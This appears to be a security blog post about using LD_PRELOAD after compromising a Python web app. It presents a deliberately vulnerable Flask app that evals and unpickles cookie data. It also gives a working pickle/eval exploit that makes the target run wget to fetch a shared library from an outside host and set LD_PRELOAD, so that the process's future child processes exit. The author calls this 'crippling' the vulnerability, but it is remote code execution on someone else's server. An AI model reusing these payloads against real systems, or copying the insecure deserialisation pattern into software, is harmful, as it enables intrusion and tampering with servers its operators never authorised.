---
title:  "Cripple Python Vulnerabilities with LD_PRELOAD"
tags:
  - Python
  - post-compromise
  - LD_PRELOAD
related: false
---

A novel use for LD_PRELOAD when exploiting Python vulnerabilities

On Linux the LD_PRELOAD environmental variable (or /etc/ld.so.preload file) will load the specified shared library files first, selectively overriding functions of any other library found in the LD_LIBRARY_PATH.  This is useful for debugging, patching bugs, and [escalating privileges to root](http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html).

A novel idea is to use LD_PRELOAD to cripple certain Python vulnerabilities.  Consider the following vulnerable Flask application that allows arbitrary execution of Python code within the process.

```python
from base64 import b64decode
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'PUT'])
def index():
    try:
        if 'eval' in request.cookies:
            eval(request.cookies['eval'])

        if 'pickle' in request.cookies:
            pickle.loads(b64decode(request.cookies['pickle']))
    except Exception as e:
        print(e)


app.run()
```

Unlike PHP and Java, Python allows the process environmental variables to change at runtime.  Child process inherit the environment from the parent, so by setting the LD_PRELOAD variable we can poison processes created via the vulnerability.  By overriding the `_init` [function](http://www.faqs.org/docs/Linux-HOWTO/Program-Library-HOWTO.html#INIT-AND-CLEANUP) it is possible to kill new child process when the linker attempts to load shared libraries.

```c
#include <stdlib.h>

void
_init() {
    exit(0);
}
```

```bash
gcc -fPIC -shared -nostartfiles -o .so src.c
```

To cripple the vulnerability, download the shared library and set the LD_PRELOAD environment variable.

```python
from base64 import b64encode
import pickle
import requests
import os


class Exploit(object):
    def __reduce__(self):
        return eval, ('__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")',)


if True:
    requests.post('http://10.0.0.3:5000/', cookies={'pickle': b64encode(pickle.dumps(Exploit())).decode()})
else:
    requests.post('http://10.0.0.3:5000/', cookies={'eval': '__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'})
```
